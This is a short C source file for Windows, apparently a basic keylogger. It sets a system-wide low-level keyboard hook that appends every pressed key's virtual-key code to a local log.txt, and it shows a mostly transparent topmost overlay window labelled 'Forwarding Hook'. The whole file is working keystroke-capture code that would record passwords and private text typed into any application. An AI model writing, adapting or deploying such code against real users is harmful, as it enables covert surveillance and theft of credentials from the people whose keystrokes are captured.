
#include <windows.h>
#include <tchar.h>

#include <stdio.h>

FILE* f;
void Initlog() {
    f = fopen("log.txt", "a+");
    if (!f) {
        exit(1);
    }

}

void logChar(char c) {
    fprintf(f, "%c", c);

}

void destroyLog() {
    fclose(f);
}

static HHOOK g_hKeyboardHook = NULL;
static HWND g_hOverlayWnd = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

       
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            
            logChar(pKey->vkCode);
            
        }
    }

   
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 255));
        FillRect(hdc, &ps.rcPaint, hBrush);
        DeleteObject(hBrush);

        SetTextColor(hdc, RGB(255, 255, 255));
        SetBkMode(hdc, TRANSPARENT);

        RECT rc;
        GetClientRect(hwnd, &rc);
        DrawText(hdc, TEXT("Hook: A -> Forwarded"), -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_NCHITTEST:
        return HTCAPTION;

    case WM_DESTROY:
       
        if (g_hKeyboardHook) {
            UnhookWindowsHookEx(g_hKeyboardHook);
            g_hKeyboardHook = NULL;
        }
        destroyLog();
        PostQuitMessage(0);
        return 0;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
   
    Initlog();
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = NULL;
    wc.lpszClassName = TEXT("TransparentHookClass");

    if (!RegisterClassEx(&wc)) return 0;

    g_hOverlayWnd = CreateWindowEx(
        WS_EX_LAYERED | WS_EX_TOPMOST,
        TEXT("TransparentHookClass"),
        TEXT("Forwarding Hook"),
        WS_POPUP,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 80,
        NULL, NULL, hInstance, NULL
    );
    if (!g_hOverlayWnd) return 0;

    SetLayeredWindowAttributes(g_hOverlayWnd, RGB(255, 0, 255), 0, LWA_COLORKEY);

 
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    if (!g_hKeyboardHook) {
        MessageBox(NULL, TEXT("Ошибка установки хука!"), TEXT("Error"), MB_ICONERROR);
        return 0;
    }

    ShowWindow(g_hOverlayWnd, nCmdShow);
    UpdateWindow(g_hOverlayWnd);

 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}